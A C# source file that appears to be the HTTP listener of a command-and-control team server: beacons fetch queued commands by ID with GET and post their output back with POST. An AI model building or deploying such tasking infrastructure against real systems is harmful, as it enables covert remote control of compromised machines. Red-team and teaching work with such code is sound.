using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;


namespace TeamServer.Listeners
{
    class CustomHttpListener : IListener
    {
        public List<Beacon> Beacons { get; set; }

        private HttpListener listener = null;
        private Func<Task> listenerHandler = null;
        private Task listenerTask = null;
        private bool listening = false;

        private List<string> ignoreUri = new List<string>
        {
            "favicon.ico"
        };

        public CustomHttpListener(string ip = "localhost", int port = 8081)
        {
            listener = new HttpListener();

            listener.Prefixes.Add("http://"+ip+":"+port.ToString()+"/");
        }

        public bool StartListener()
        {
            Console.WriteLine("Starting HTTP Listener on " + listener.Prefixes.First());

            if (listener != null)
            {
                listener.Start();
                listening = true;
                listenerHandler = async () =>
                {
                    while (listening)
                    {
                        HttpListenerContext context = listener.GetContext();
                        HttpListenerRequest req = context.Request;

                        string data;
                        byte[] buffer;
                        Stream ros;

                        List<string> uriSegments = new List<string>(req.Url.Segments);

                        using HttpListenerResponse resp = context.Response;

                        if (uriSegments.Count == 2)
                        {
                            // get the beacon ID
                            string id = uriSegments.Last();

                            if (!ignoreUri.Contains(id))
                            {
                                if (req.HttpMethod == "GET") // GET - beacon gets next instructions
                                {
                                    List<string> commands = ((IListener)this).GetBeaconCommands(id);
                                    string jsonCommands = JsonSerializer.Serialize<List<string>>(commands);

                                    resp.Headers.Set("Content-Type", "application/json");

                                    data = jsonCommands;
                                    buffer = Encoding.UTF8.GetBytes(data);
                                    resp.ContentLength64 = buffer.Length;

                                    ros = resp.OutputStream;
                                    ros.Write(buffer, 0, buffer.Length);
                                    ros.Close();
                                }
                                else if(req.HttpMethod == "POST") // POST - beacon sends output back
                                {
                                    // we will assume a JSON structure: {"output": "STDOUT output from beacon"}
                                    string body = new StreamReader(context.Request.InputStream).ReadToEnd();

                                    ((IListener)this).AddBeaconOutput(id, body);

                                    byte[] b = Encoding.UTF8.GetBytes("ACK");
                                    context.Response.StatusCode = 200;
                                    context.Response.KeepAlive = false;
                                    context.Response.ContentLength64 = b.Length;

                                    // output from the server
                                    var output = context.Response.OutputStream;
                                    output.Write(b, 0, b.Length);
                                    context.Response.Close();
                                }
                                continue;
                            }
                        }

                        data = "Listening...";
                        buffer = Encoding.UTF8.GetBytes(data);
                        resp.ContentLength64 = buffer.Length;

                        ros = resp.OutputStream;
                        ros.Write(buffer, 0, buffer.Length);
                        ros.Close();
                    }
                };

                listenerTask = Task.Run(listenerHandler);

                return true;
            }
            else
            {
                throw new ArgumentException();
            }
            return false;
        }

        public void StopListener()
        {
            if (listener.IsListening)
            {
                listening = false;

                listener.Stop();
                listener = null;
                listenerTask.Dispose();
                listenerTask = null;
            }
        }
    }
}
